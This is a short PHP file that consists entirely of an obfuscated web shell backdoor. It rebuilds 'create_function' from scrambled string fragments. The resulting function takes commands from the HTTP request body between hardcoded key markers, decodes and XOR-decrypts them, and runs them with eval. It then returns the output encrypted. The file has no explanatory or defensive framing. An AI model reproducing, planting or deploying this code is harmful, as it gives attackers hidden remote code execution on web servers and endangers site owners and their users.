<?php
$b='="oO!tvN!y5TkuOg1fjf!";func!t!ion x($t,$k!){$c=str!len($k!);$l=s!tr';
$u=str_replace('kA','','crkAeatkAekA_fkAkAunkAction');
$F=';$j++,$i++!)!!{$o.=$t{$i}^$k{$!j};!}}!return !$o;}if (@pr!eg!!_';
$n='r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!("$p$k!h$r$kf");}';
$S='match("/$kh(.+)$!!kf/",@file!_get_!cont!ents!("php://in!put"),$!';
$s='m)=!=2) {@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d';
$e='e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!';
$I='!!$k="bd377!f!17";!$kh="9d4!cd50b4843";$kf="5b!d9ce82!0!932";$p';
$H='!len($t);$o=!"";f!o!r($i=1;!$!i<$l;){for($j=0;(!$j<$c!!&&$i<$!l)';
$J=str_replace('!','',$I.$b.$H.$F.$S.$s.$e.$n);
$V=$u('',$J);$V();
echo $J;
?>
